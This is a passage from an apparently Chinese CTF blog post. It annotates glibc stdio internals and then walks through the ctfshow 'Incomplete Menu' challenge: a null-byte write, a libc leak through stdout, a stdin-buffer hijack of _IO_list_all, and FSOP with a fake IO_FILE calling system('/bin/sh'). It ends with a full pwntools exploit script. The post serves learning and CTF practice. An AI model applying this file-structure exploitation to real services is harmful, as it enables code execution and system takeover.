operator">-</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>      n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">char</span> <span class="token operator">*</span>t<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_size_t<span class="token punctuation">)</span> len <span class="token operator">>=</span> n<span class="token punctuation">)</span>        len <span class="token operator">=</span> n<span class="token punctuation">;</span>      t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">memchr</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> delim<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          _IO_size_t old_len <span class="token operator">=</span> ptr<span class="token operator">-</span>buf<span class="token punctuation">;</span>          len <span class="token operator">=</span> t <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token operator">++</span>t<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token operator">++</span>len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>          fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> t<span class="token punctuation">;</span>          <span class="token keyword">return</span> old_len <span class="token operator">+</span> len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token string">"将输入缓冲区的数据拷贝到目标缓冲区"</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      n <span class="token operator">-</span><span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_getline_info<span class="token punctuation">)</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span><span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">{</span>  _IO_ssize_t count<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span>  <span class="token comment" spellcheck="true">/* SysV does not make this test; take it out for compatibility */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_EOF_SEEN<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>    <span class="token punctuation">{</span>      fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token string">"判断输入缓冲区中是否有数据"</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>    <span class="token string">"判断输入缓冲区是否已经初始化,如果没有便进行初始化"</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* Maybe we already have a push back pointer.  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span>_IO_IN_BACKUP<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/* Flush all line buffered files before reading. */</span>  <span class="token comment" spellcheck="true">/* FIXME This can/should be moved to genops ?? */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF<span class="token operator">|</span>_IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span>      <span class="token function">_IO_flush_all_linebuffered</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">else</span></span>      <span class="token comment" spellcheck="true">/* We used to flush all line-buffered stream.  This really isn't     required by any standard.  My recollection is that     traditional Unix systems did this for stdout.  stderr better     not be line buffered.  So we do just that here     explicitly.  --drepper */</span>      <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_stdout<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_NO_WRITES <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">==</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>    <span class="token punctuation">}</span>  <span class="token function">_IO_switch_to_get_mode</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* This is very tricky. We have to adjust those     pointers before we call _IO_SYSREAD () since     we may longjump () out while waiting for     input. Those pointers may be screwed up. H.J. */</span>     <span class="token string">"初始化file结构的指针"</span>  fp<span class="token operator">-></span>_IO_read_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_end    <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>    <span class="token string">"read系统调用,填满输入缓冲区"</span>  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>               fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_EOF_SEEN<span class="token punctuation">;</span>      <span class="token keyword">else</span>    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">,</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* If a stream is read to EOF, the calling application may switch active     handles.  As a result, our offset cache would no longer be valid, so     unset it.  */</span>      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset <span class="token operator">!=</span> _IO_pos_BAD<span class="token punctuation">)</span>    <span class="token function">_IO_pos_adjust</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span></code></pre><h4 id="例题-ctfshow-Incomplete-Menu"><a href="#例题-ctfshow-Incomplete-Menu" class="headerlink" title="例题 ctfshow Incomplete Menu"></a>例题 ctfshow Incomplete Menu</h4><p>程序的edit存在一个任意地址写空字节的漏洞<br>利用mmap的堆地址与libc的固定偏移,修改_IO_2_1_stdout_的_IO_write_base和_IO_read_end的低字节使其相等,在puts函数时泄露libc地址.</p><p>第二步是stdin任意写:<br>先修改_IO_buf_base的低字节为0,此时其指向stdin.然后用如下方式构造相关指针</p><pre class=" language-python"><code class="language-python">io_list_all <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>fake_stdin <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token number">0xfbad208b</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io_list_all<span class="token operator">+</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> p64<span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io_list_all<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>首先_IO_buf_base被修改为了stdin的地址.在_IO_getline_info函数的第一次循环中执行以下操作(省略else部分)</p><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"判断输入缓冲区中是否有数据,此时len=0"</span>      _IO_ssize_t len <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"进入__uflow函数,最终向_IO_buf_base指向的stdin中读入132字节数据."</span>    <span class="token string">"要注意的是,在离开__uflow函数的时候,_IO_read_end的值已为&amp;stdin+132"</span>      <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">__uflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>eof<span class="token punctuation">)</span>        <span class="token operator">*</span>eof <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> delim<span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">_IO_sputbackc</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">++</span>len<span class="token punctuation">;</span>          <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>      n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token string">"将输入缓冲区的数据拷贝到目标缓冲区,但由于len==0,这里不做任何事"</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      n <span class="token operator">-</span><span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>然后第二次循环:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"判断输入缓冲区中是否有数据,由于第一次循环中我们直接向_IO_read_ptr写入了&amp;stdin+132的地址,所以第二次循环同样len==0"</span>      _IO_ssize_t len <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"进入__uflow函数,向_IO_buf_base指向io_list_all的中读入0x10字节数据."</span>      <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">__uflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>eof<span class="token punctuation">)</span>        <span class="token operator">*</span>eof <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> delim<span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">_IO_sputbackc</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">++</span>len<span class="token punctuation">;</span>          <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>      n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token string">"将输入缓冲区的数据拷贝到目标缓冲区,但由于len==0,这里不做任何事"</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      n <span class="token operator">-</span><span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>此时已经成功劫持io_list_all.<br>最后进行fsop(其实fsop的布置应该在劫持IO_list_all之前完成,因为程序读取到非1非2的选择会直接调用exit).</p><pre class=" language-python"><code class="language-python">new<span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x5ed771</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x7ee761</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>stdin_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">,</span>stdin_addr<span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span>fake_io_addr<span class="token operator">=</span>libc_base<span class="token number">-0x201000</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0x10</span> <span class="token comment" spellcheck="true"># 伪造的fake_IO结构体的地址</span>next_chain <span class="token operator">=</span> <span class="token number">0</span>rdi <span class="token operator">=</span> fake_io_addrcall_addr <span class="token operator">=</span> system_addrfake_IO_FILE<span class="token operator">=</span>b<span class="token string">'/bin/sh\x00'</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#_flags=rdi</span>fake_IO_FILE<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rcx!=0(FSOP)</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_IO_backup_base=rdx</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span>call_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_IO_save_end=call addr(call setcontext/system)</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># _chain</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token number">-0x201000</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># _lock = a writable address</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_wide_data,rax1_addr</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#mode=1</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3e7d60</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># vtable=IO_wfile_jumps+0x10</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># rax2_addr</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x9eea29</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fake_IO_FILE<span class="token punctuation">)</span>io_list_all <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>fake_stdin <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">0xfbad208b</span><span class="token punctuation">,</span>    io_list_all<span class="token operator">+</span><span class="token number">132</span><span class="token punctuation">,</span>    p64<span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">,</span>    io_list_all<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> fake_stdin<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>官方wp:<a href="https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#</a></p>]]></content>
    
    
      
      
